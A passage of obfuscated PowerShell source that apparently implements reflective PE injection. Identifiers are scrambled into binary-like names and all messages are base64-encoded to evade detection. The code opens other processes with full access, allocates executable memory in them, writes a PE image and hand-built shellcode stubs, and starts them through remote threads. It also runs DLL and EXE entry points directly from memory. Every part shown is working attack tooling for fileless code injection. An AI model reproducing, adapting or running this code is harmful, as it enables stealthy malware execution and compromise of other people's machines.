            Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFACAAZgBpAGwAZQAgAGQAbwBlAHMAbgAnAHQAIABzAHUAcABwAG8AcgB0ACAAQQBTAEwAUgAgAGIAdQB0ACAALQBGAG8AcgBjAGUAQQBTAEwAUgAgAGkAcwAgAHMAZQB0AC4AIABGAG8AcgBjAGkAbgBnACAAQQBTAEwAUgAgAG8AbgAgAHQAaABlACAAUABFACAAZgBpAGwAZQAuACAAVABoAGkAcwAgAGMAbwB1AGwAZAAgAHIAZQBzAHUAbAB0ACAAaQBuACAAYQAgAGMAcgBhAHMAaAAuAA==')))
        }
        if ($ForceASLR -and ${10000111110101111})
        {
            Write-Error $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAG4AbgBvAHQAIAB1AHMAZQAgAEYAbwByAGMAZQBBAFMATABSACAAdwBoAGUAbgAgAGwAbwBhAGQAaQBuAGcAIABpAG4AIAB0AG8AIABhACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzAC4A'))) -ErrorAction Stop
        }
        if (${10000111110101111} -and (-not ${01011110100110011}))
        {
            Write-Error $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFACAAZABvAGUAcwBuACcAdAAgAHMAdQBwAHAAbwByAHQAIABBAFMATABSAC4AIABDAGEAbgBuAG8AdAAgAGwAbwBhAGQAIABhACAAbgBvAG4ALQBBAFMATABSACAAUABFACAAaQBuACAAdABvACAAYQAgAHIAZQBtAG8AdABlACAAcAByAG8AYwBlAHMAcwA='))) -ErrorAction Stop
        }
		${_10100111001011110} = [IntPtr]::Zero				
		${10010011011011000} = [IntPtr]::Zero		
		if (${10000111110101111} -eq $true)
		{
			${_10100111001011110} = $Win32Functions.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr]${_00101101001101101}.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			${10010011011011000} = $Win32Functions.VirtualAllocEx.Invoke(${_10100101101101111}, ${10111111001110010}, [UIntPtr]${_00101101001101101}.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			if (${10010011011011000} -eq [IntPtr]::Zero)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABhAGwAbABvAGMAYQB0AGUAIABtAGUAbQBvAHIAeQAgAGkAbgAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzAC4AIABJAGYAIAB0AGgAZQAgAFAARQAgAGIAZQBpAG4AZwAgAGwAbwBhAGQAZQBkACAAZABvAGUAcwBuACcAdAAgAHMAdQBwAHAAbwByAHQAIABBAFMATABSACwAIABpAHQAIABjAG8AdQBsAGQAIABiAGUAIAB0AGgAYQB0ACAAdABoAGUAIAByAGUAcQB1AGUAcwB0AGUAZAAgAGIAYQBzAGUAIABhAGQAZAByAGUAcwBzACAAbwBmACAAdABoAGUAIABQAEUAIABpAHMAIABhAGwAcgBlAGEAZAB5ACAAaQBuACAAdQBzAGUA')))
			}
		}
		else
		{
			if (${00010100110010010} -eq $true)
			{
				${_10100111001011110} = $Win32Functions.VirtualAlloc.Invoke(${10111111001110010}, [UIntPtr]${_00101101001101101}.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			}
			else
			{
				${_10100111001011110} = $Win32Functions.VirtualAlloc.Invoke(${10111111001110010}, [UIntPtr]${_00101101001101101}.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			}
			${10010011011011000} = ${_10100111001011110}
		}
		[IntPtr]${10111001000110000} = _01100001001101001 (${_10100111001011110}) ([Int64]${_00101101001101101}.SizeOfImage)
		if (${_10100111001011110} -eq [IntPtr]::Zero)
		{ 
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBpAHIAdAB1AGEAbABBAGwAbABvAGMAIABmAGEAaQBsAGUAZAAgAHQAbwAgAGEAbABsAG8AYwBhAHQAZQAgAG0AZQBtAG8AcgB5ACAAZgBvAHIAIABQAEUALgAgAEkAZgAgAFAARQAgAGkAcwAgAG4AbwB0ACAAQQBTAEwAUgAgAGMAbwBtAHAAYQB0AGkAYgBsAGUALAAgAHQAcgB5ACAAcgB1AG4AbgBpAG4AZwAgAHQAaABlACAAcwBjAHIAaQBwAHQAIABpAG4AIABhACAAbgBlAHcAIABQAG8AdwBlAHIAUwBoAGUAbABsACAAcAByAG8AYwBlAHMAcwAgACgAdABoAGUAIABuAGUAdwAgAFAAbwB3AGUAcgBTAGgAZQBsAGwAIABwAHIAbwBjAGUAcwBzACAAdwBpAGwAbAAgAGgAYQB2AGUAIABhACAAZABpAGYAZgBlAHIAZQBuAHQAIABtAGUAbQBvAHIAeQAgAGwAYQB5AG8AdQB0ACwAIABzAG8AIAB0AGgAZQAgAGEAZABkAHIAZQBzAHMAIAB0AGgAZQAgAFAARQAgAHcAYQBuAHQAcwAgAG0AaQBnAGgAdAAgAGIAZQAgAGYAcgBlAGUAKQAuAA==')))
		}		
		[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, ${_10100111001011110}, ${_00101101001101101}.SizeOfHeaders) | Out-Null
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAdABpAG4AZwAgAGQAZQB0AGEAaQBsAGUAZAAgAFAARQAgAGkAbgBmAG8AcgBtAGEAdABpAG8AbgAgAGYAcgBvAG0AIAB0AGgAZQAgAGgAZQBhAGQAZQByAHMAIABsAG8AYQBkAGUAZAAgAGkAbgAgAG0AZQBtAG8AcgB5AA==')))
		${_00101101001101101} = _01001001110001010 -_10100111001011110 ${_10100111001011110} -Win32Types $Win32Types -Win32Constants $Win32Constants
		${_00101101001101101} | Add-Member -MemberType NoteProperty -Name EndAddress -Value ${10111001000110000}
		${_00101101001101101} | Add-Member -MemberType NoteProperty -Name EffectivePEHandle -Value ${10010011011011000}
		Write-Verbose "StartAddress: $(_01101110011100000 ${_10100111001011110})    EndAddress: $(_01101110011100000 ${10111001000110000})"
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHAAeQAgAFAARQAgAHMAZQBjAHQAaQBvAG4AcwAgAGkAbgAgAHQAbwAgAG0AZQBtAG8AcgB5AA==')))
		_00110101001000011 -PEBytes $PEBytes -_00101101001101101 ${_00101101001101101} -Win32Functions $Win32Functions -Win32Types $Win32Types
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBwAGQAYQB0AGUAIABtAGUAbQBvAHIAeQAgAGEAZABkAHIAZQBzAHMAZQBzACAAYgBhAHMAZQBkACAAbwBuACAAdwBoAGUAcgBlACAAdABoAGUAIABQAEUAIAB3AGEAcwAgAGEAYwB0AHUAYQBsAGwAeQAgAGwAbwBhAGQAZQBkACAAaQBuACAAbQBlAG0AbwByAHkA')))
		_01100001001001011 -_00101101001101101 ${_00101101001101101} -_00110111101011000 ${_00110111101011000} -Win32Constants $Win32Constants -Win32Types $Win32Types
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBtAHAAbwByAHQAIABEAEwATAAnAHMAIABuAGUAZQBkAGUAZAAgAGIAeQAgAHQAaABlACAAUABFACAAdwBlACAAYQByAGUAIABsAG8AYQBkAGkAbgBnAA==')))
		if (${10000111110101111} -eq $true)
		{
			_00100000101001011 -_00101101001101101 ${_00101101001101101} -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants -_10100101101101111 ${_10100101101101111}
		}
		else
		{
			_00100000101001011 -_00101101001101101 ${_00101101001101101} -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
		}
		if (${10000111110101111} -eq $false)
		{
			if (${00010100110010010} -eq $true)
			{
				Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBwAGQAYQB0AGUAIABtAGUAbQBvAHIAeQAgAHAAcgBvAHQAZQBjAHQAaQBvAG4AIABmAGwAYQBnAHMA')))
				_10001010111000000 -_00101101001101101 ${_00101101001101101} -Win32Functions $Win32Functions -Win32Constants $Win32Constants -Win32Types $Win32Types
			}
			else
			{
				Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFACAAYgBlAGkAbgBnACAAcgBlAGYAbABlAGMAdABpAHYAZQBsAHkAIABsAG8AYQBkAGUAZAAgAGkAcwAgAG4AbwB0ACAAYwBvAG0AcABhAHQAaQBiAGwAZQAgAHcAaQB0AGgAIABOAFgAIABtAGUAbQBvAHIAeQAsACAAawBlAGUAcABpAG4AZwAgAG0AZQBtAG8AcgB5ACAAYQBzACAAcgBlAGEAZAAgAHcAcgBpAHQAZQAgAGUAeABlAGMAdQB0AGUA')))
			}
		}
		else
		{
			Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFACAAYgBlAGkAbgBnACAAbABvAGEAZABlAGQAIABpAG4AIAB0AG8AIABhACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzACwAIABuAG8AdAAgAGEAZABqAHUAcwB0AGkAbgBnACAAbQBlAG0AbwByAHkAIABwAGUAcgBtAGkAcwBzAGkAbwBuAHMA')))
		}
		if (${10000111110101111} -eq $true)
		{
			[UInt32]${01111101001000000} = 0
			${01110110101110011} = $Win32Functions.WriteProcessMemory.Invoke(${_10100101101101111}, ${10010011011011000}, ${_10100111001011110}, [UIntPtr](${_00101101001101101}.SizeOfImage), [Ref]${01111101001000000})
			if (${01110110101110011} -eq $false)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIAB3AHIAaQB0AGUAIABzAGgAZQBsAGwAYwBvAGQAZQAgAHQAbwAgAHIAZQBtAG8AdABlACAAcAByAG8AYwBlAHMAcwAgAG0AZQBtAG8AcgB5AC4A')))
			}
		}
		if (${_00101101001101101}.FileType -ieq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABMAEwA'))))
		{
			if (${10000111110101111} -eq $false)
			{
				Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbABpAG4AZwAgAGQAbABsAG0AYQBpAG4AIABzAG8AIAB0AGgAZQAgAEQATABMACAAawBuAG8AdwBzACAAaQB0ACAAaABhAHMAIABiAGUAZQBuACAAbABvAGEAZABlAGQA')))
				${10101110101101110} = _01100001001101001 (${_00101101001101101}.PEHandle) (${_00101101001101101}.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
				${00011000011100001} = _10000101101101101 @([IntPtr], [UInt32], [IntPtr]) ([Bool])
				${00100010000010100} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${10101110101101110}, ${00011000011100001})
				${00100010000010100}.Invoke(${_00101101001101101}.PEHandle, 1, [IntPtr]::Zero) | Out-Null
			}
			else
			{
				${10101110101101110} = _01100001001101001 (${10010011011011000}) (${_00101101001101101}.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
				if (${_00101101001101101}.PE64Bit -eq $true)
				{
					${01100101011001111} = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
					${10101010001111100} = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
					${10010010000001111} = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
				}
				else
				{
					${01100101011001111} = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
					${10101010001111100} = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
					${10010010000001111} = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
				}
				${01010110000000010} = ${01100101011001111}.Length + ${10101010001111100}.Length + ${10010010000001111}.Length + (${10000101110111000} * 2)
				${10110100101010101} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${01010110000000010})
				${01110010010110000} = ${10110100101010101}
				_00000100110100000 -_01111011100010111 ${01100101011001111} -_10100011101010110 ${10110100101010101}
				${10110100101010101} = _01100001001101001 ${10110100101010101} (${01100101011001111}.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr(${10010011011011000}, ${10110100101010101}, $false)
				${10110100101010101} = _01100001001101001 ${10110100101010101} (${10000101110111000})
				_00000100110100000 -_01111011100010111 ${10101010001111100} -_10100011101010110 ${10110100101010101}
				${10110100101010101} = _01100001001101001 ${10110100101010101} (${10101010001111100}.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr(${10101110101101110}, ${10110100101010101}, $false)
				${10110100101010101} = _01100001001101001 ${10110100101010101} (${10000101110111000})
				_00000100110100000 -_01111011100010111 ${10010010000001111} -_10100011101010110 ${10110100101010101}
				${10110100101010101} = _01100001001101001 ${10110100101010101} (${10010010000001111}.Length)
				${10100000110100100} = $Win32Functions.VirtualAllocEx.Invoke(${_10100101101101111}, [IntPtr]::Zero, [UIntPtr][UInt64]${01010110000000010}, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
				if (${10100000110100100} -eq [IntPtr]::Zero)
				{
					Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABhAGwAbABvAGMAYQB0AGUAIABtAGUAbQBvAHIAeQAgAGkAbgAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzACAAZgBvAHIAIABzAGgAZQBsAGwAYwBvAGQAZQA=')))
				}
				${01110110101110011} = $Win32Functions.WriteProcessMemory.Invoke(${_10100101101101111}, ${10100000110100100}, ${01110010010110000}, [UIntPtr][UInt64]${01010110000000010}, [Ref]${01111101001000000})
				if ((${01110110101110011} -eq $false) -or ([UInt64]${01111101001000000} -ne [UInt64]${01010110000000010}))
				{
					Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIAB3AHIAaQB0AGUAIABzAGgAZQBsAGwAYwBvAGQAZQAgAHQAbwAgAHIAZQBtAG8AdABlACAAcAByAG8AYwBlAHMAcwAgAG0AZQBtAG8AcgB5AC4A')))
				}
				${01110111000111100} = _10101101011101000 -_01100001010100111 ${_10100101101101111} -_10100000001011100 ${10100000110100100} -Win32Functions $Win32Functions
				${10010100000000000} = $Win32Functions.WaitForSingleObject.Invoke(${01110111000111100}, 20000)
				if (${10010100000000000} -ne 0)
				{
					Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAEMAcgBlAGEAdABlAFIAZQBtAG8AdABlAFQAaAByAGUAYQBkACAAdABvACAAYwBhAGwAbAAgAEcAZQB0AFAAcgBvAGMAQQBkAGQAcgBlAHMAcwAgAGYAYQBpAGwAZQBkAC4A')))
				}
				$Win32Functions.VirtualFreeEx.Invoke(${_10100101101101111}, ${10100000110100100}, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			}
		}
		elseif (${_00101101001101101}.FileType -ieq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBYAEUA'))))
		{
			[IntPtr]${_01110001100000111} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
			[System.Runtime.InteropServices.Marshal]::WriteByte(${_01110001100000111}, 0, 0x00)
			${00001111011000011} = _10111000001011101 -_00101101001101101 ${_00101101001101101} -Win32Functions $Win32Functions -Win32Constants $Win32Constants -_00000100011000010 $ExeArgs -_01110001100000111 ${_01110001100000111}
			[IntPtr]${00011101011100010} = _01100001001101001 (${_00101101001101101}.PEHandle) (${_00101101001101101}.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			Write-Verbose "Call EXE Main function. Address: $(_01101110011100000 ${00011101011100010}). Creating thread for the EXE to run in."
			$Win32Functions.CreateThread.Invoke([IntPtr]::Zero, [IntPtr]::Zero, ${00011101011100010}, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null
			while($true)
			{
				[Byte]${10011001101101001} = [System.Runtime.InteropServices.Marshal]::ReadByte(${_01110001100000111}, 0)
				if (${10011001101101001} -eq 1)
				{
					_01010001000001111 -_00110000001111110 ${00001111011000011} -Win32Functions $Win32Functions -Win32Constants $Win32Constants
					Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBYAEUAIAB0AGgAcgBlAGEAZAAgAGgAYQBzACAAYwBvAG0AcABsAGUAdABlAGQALgA=')))
					break
				}
				else
				{
					sleep -Seconds 1
				}
			}
		}
		return @(${_00101101001101101}.PEHandle, ${10010011011011000})
	}
	Function _10101110111010011
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		${_10100111001011110}
		)
		$Win32Constants = _00000010000011111
		$Win32Functions = _00010101001110011
		$Win32Types = _01001100001111011
		${_00101101001101101} = _01001001110001010 -_10100111001011110 ${_10100111001011110} -Win32Types $Win32Types -Win32Constants $Win32Constants
		if (${_00101101001101101}.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]${00000000011101000} = _01100001001101001 ([Int64]${_00101101001101101}.PEHandle) ([Int64]${_00101101001101101}.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			while ($true)
			{
				${01111101100100011} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${00000000011101000}, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
				if (${01111101100100011}.Characteristics -eq 0 `
						-and ${01111101100100011}.FirstThunk -eq 0 `
						-and ${01111101100100011}.ForwarderChain -eq 0 `
						-and ${01111101100100011}.Name -eq 0 `
						-and ${01111101100100011}.TimeDateStamp -eq 0)
				{
					Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG4AZQAgAHUAbgBsAG8AYQBkAGkAbgBnACAAdABoAGUAIABsAGkAYgByAGEAcgBpAGUAcwAgAG4AZQBlAGQAZQBkACAAYgB5ACAAdABoAGUAIABQAEUA')))
					break
				}
				${01011101010000101} = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((_01100001001101001 ([Int64]${_00101101001101101}.PEHandle) ([Int64]${01111101100100011}.Name)))
				${01001010011010101} = $Win32Functions.GetModuleHandle.Invoke(${01011101010000101})
				if (${01001010011010101} -eq $null)
				{
					Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAZwBlAHQAdABpAG4AZwAgAEQATABMACAAaABhAG4AZABsAGUAIABpAG4AIABNAGUAbQBvAHIAeQBGAHIAZQBlAEwAaQBiAHIAYQByAHkALAAgAEQATABMAE4AYQBtAGUAOgAgACQAewAwADEAMAAxADEAMQAwADEAMAAxADAAMAAwADAAMQAwADEAfQAuACAAQwBvAG4AdABpAG4AdQBpAG4AZwAgAGEAbgB5AHcAYQB5AHMA'))) -WarningAction Continue
				}
				${01110110101110011} = $Win32Functions.FreeLibrary.Invoke(${01001010011010101})
				if (${01110110101110011} -eq $false)
				{
					Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABmAHIAZQBlACAAbABpAGIAcgBhAHIAeQA6ACAAJAB7ADAAMQAwADEAMQAxADAAMQAwADEAMAAwADAAMAAxADAAMQB9AC4AIABDAG8AbgB0AGkAbgB1AGkAbgBnACAAYQBuAHkAdwBhAHkAcwAuAA=='))) -WarningAction Continue
				}
				${00000000011101000} = _01100001001101001 (${00000000011101000}) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbABpAG4AZwAgAGQAbABsAG0AYQBpAG4AIABzAG8AIAB0AGgAZQAgAEQATABMACAAawBuAG8AdwBzACAAaQB0ACAAaQBzACAAYgBlAGkAbgBnACAAdQBuAGwAbwBhAGQAZQBkAA==')))
		${10101110101101110} = _01100001001101001 (${_00101101001101101}.PEHandle) (${_00101101001101101}.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
		${00011000011100001} = _10000101101101101 @([IntPtr], [UInt32], [IntPtr]) ([Bool])
		${00100010000010100} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${10101110101101110}, ${00011000011100001})
		${00100010000010100}.Invoke(${_00101101001101101}.PEHandle, 0, [IntPtr]::Zero) | Out-Null
		${01110110101110011} = $Win32Functions.VirtualFree.Invoke(${_10100111001011110}, [UInt64]0, $Win32Constants.MEM_RELEASE)
		if (${01110110101110011} -eq $false)
		{
			Write-Warning $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABjAGEAbABsACAAVgBpAHIAdAB1AGEAbABGAHIAZQBlACAAbwBuACAAdABoAGUAIABQAEUAJwBzACAAbQBlAG0AbwByAHkALgAgAEMAbwBuAHQAaQBuAHUAaQBuAGcAIABhAG4AeQB3AGEAeQBzAC4A'))) -WarningAction Continue
		}
	}
	Function _10111111001000001
	{
		$Win32Functions = _00010101001110011
		$Win32Types = _01001100001111011
		$Win32Constants =  _00000010000011111
		${_10100101101101111} = [IntPtr]::Zero
		if (($ProcId -ne $null) -and ($ProcId -ne 0) -and ($ProcName -ne $null) -and ($ProcName -ne ""))
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAG4AJwB0ACAAcwB1AHAAcABsAHkAIABhACAAUAByAG8AYwBJAGQAIABhAG4AZAAgAFAAcgBvAGMATgBhAG0AZQAsACAAYwBoAG8AbwBzAGUAIABvAG4AZQAgAG8AcgAgAHQAaABlACAAbwB0AGgAZQByAA==')))
		}
		elseif ($ProcName -ne $null -and $ProcName -ne "")
		{
			${00010001100101111} = @(ps -Name $ProcName -ErrorAction SilentlyContinue)
			if (${00010001100101111}.Count -eq 0)
			{
				Throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAG4AJwB0ACAAZgBpAG4AZAAgAHAAcgBvAGMAZQBzAHMAIAAkAFAAcgBvAGMATgBhAG0AZQA=')))
			}
			elseif (${00010001100101111}.Count -gt 1)
			{
				${01001001111111010} = ps | where { $_.Name -eq $ProcName } | select ProcessName, Id, SessionId
				echo ${01001001111111010}
				Throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBvAHIAZQAgAHQAaABhAG4AIABvAG4AZQAgAGkAbgBzAHQAYQBuAGMAZQAgAG8AZgAgACQAUAByAG8AYwBOAGEAbQBlACAAZgBvAHUAbgBkACwAIABwAGwAZQBhAHMAZQAgAHMAcABlAGMAaQBmAHkAIAB0AGgAZQAgAHAAcgBvAGMAZQBzAHMAIABJAEQAIAB0AG8AIABpAG4AagBlAGMAdAAgAGkAbgAgAHQAbwAuAA==')))
			}
			else
			{
				$ProcId = ${00010001100101111}[0].ID
			}
		}
		if (($ProcId -ne $null) -and ($ProcId -ne 0))
		{
			${_10100101101101111} = $Win32Functions.OpenProcess.Invoke(0x001F0FFF, $false, $ProcId)
			if (${_10100101101101111} -eq [IntPtr]::Zero)
			{
				Throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHUAbABkAG4AJwB0ACAAbwBiAHQAYQBpAG4AIAB0AGgAZQAgAGgAYQBuAGQAbABlACAAZgBvAHIAIABwAHIAbwBjAGUAcwBzACAASQBEADoAIAAkAFAAcgBvAGMASQBkAA==')))
			}
			Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBvAHQAIAB0AGgAZQAgAGgAYQBuAGQAbABlACAAZgBvAHIAIAB0AGgAZQAgAHIAZQBtAG8AdABlACAAcAByAG8AYwBlAHMAcwAgAHQAbwAgAGkAbgBqAGUAYwB0ACAAaQBuACAAdABvAA==')))
		}
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbABpAG4AZwAgAEkAbgB2AG8AawBlAC0ATQBlAG0AbwByAHkATABvAGEAZABMAGkAYgByAGEAcgB5AA==')))
		${_10100111001011110} = [IntPtr]::Zero
		if (${_10100101101101111} -eq [IntPtr]::Zero)
		{
			${10001100111010100} = _01001001001010111 -PEBytes $PEBytes -ExeArgs $ExeArgs -ForceASLR $ForceASLR
		}
		else
		{
			${10001100111010100} = _01001001001010111 -PEBytes $PEBytes -ExeArgs $ExeArgs -_10100101101101111 ${_10100101101101111} -ForceASLR $ForceASLR
		}
		if (${10001100111010100} -eq [IntPtr]::Zero)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABsAG8AYQBkACAAUABFACwAIABoAGEAbgBkAGwAZQAgAHIAZQB0AHUAcgBuAGUAZAAgAGkAcwAgAE4AVQBMAEwA')))
		}
		${_10100111001011110} = ${10001100111010100}[0]
		${10110001101110101} = ${10001100111010100}[1] 
		${_00101101001101101} = _01001001110001010 -_10100111001011110 ${_10100111001011110} -Win32Types $Win32Types -Win32Constants $Win32Constants
		if ((${_00101101001101101}.FileType -ieq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABMAEwA')))) -and (${_10100101101101111} -eq [IntPtr]::Zero))
		{
	        switch ($FuncReturnType)
	        {
	            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBTAHQAcgBpAG4AZwA='))) {
	                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbABpAG4AZwAgAGYAdQBuAGMAdABpAG8AbgAgAHcAaQB0AGgAIABXAFMAdAByAGkAbgBnACAAcgBlAHQAdQByAG4AIAB0AHkAcABlAA==')))
				    [IntPtr]${10010101111001100} = _01010100101101001 -_10100111001011110 ${_10100111001011110} -_01111111011000110 $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBTAHQAcgBpAG4AZwBGAHUAbgBjAA==')))
				    if (${10010101111001100} -eq [IntPtr]::Zero)
				    {
					    Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHUAbABkAG4AJwB0ACAAZgBpAG4AZAAgAGYAdQBuAGMAdABpAG8AbgAgAGEAZABkAHIAZQBzAHMALgA=')))
				    }
				    ${00101100011000110} = _10000101101101101 @() ([IntPtr])
				    ${01001010010111000} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${10010101111001100}, ${00101100011000110})
				    [IntPtr]${10001101000000110} = ${01001010010111000}.Invoke()
				    ${00111000110101100} = [System.Runtime.InteropServices.Marshal]::PtrToStringUni(${10001101000000110})
				    echo ${00111000110101100}
	            }
	            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AHIAaQBuAGcA'))) {
	                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbABpAG4AZwAgAGYAdQBuAGMAdABpAG8AbgAgAHcAaQB0AGgAIABTAHQAcgBpAG4AZwAgAHIAZQB0AHUAcgBuACAAdAB5AHAAZQA=')))
				    [IntPtr]${01000111100110000} = _01010100101101001 -_10100111001011110 ${_10100111001011110} -_01111111011000110 $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AHIAaQBuAGcARgB1AG4AYwA=')))
				    if (${01000111100110000} -eq [IntPtr]::Zero)
				    {
					    Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHUAbABkAG4AJwB0ACAAZgBpAG4AZAAgAGYAdQBuAGMAdABpAG8AbgAgAGEAZABkAHIAZQBzAHMALgA=')))
				    }
				    ${01100110000110101} = _10000101101101101 @() ([IntPtr])
				    ${11000001100010100} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${01000111100110000}, ${01100110000110101})
				    [IntPtr]${10001101000000110} = ${11000001100010100}.Invoke()
				    ${00111000110101100} = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi(${10001101000000110})
				    echo ${00111000110101100}
	            }
	            $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBvAGkAZAA='))) {
	                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbABpAG4AZwAgAGYAdQBuAGMAdABpAG8AbgAgAHcAaQB0AGgAIABWAG8AaQBkACAAcgBlAHQAdQByAG4AIAB0AHkAcABlAA==')))
				    [IntPtr]${01011100111001110} = _01010100101101001 -_10100111001011110 ${_10100111001011110} -_01111111011000110 $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBvAGkAZABGAHUAbgBjAA==')))
				    if (${01011100111001110} -eq [IntPtr]::Zero)
				    {
					    Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHUAbABkAG4AJwB0ACAAZgBpAG4AZAAgAGYAdQBuAGMAdABpAG8AbgAgAGEAZABkAHIAZQBzAHMALgA=')))
				    }
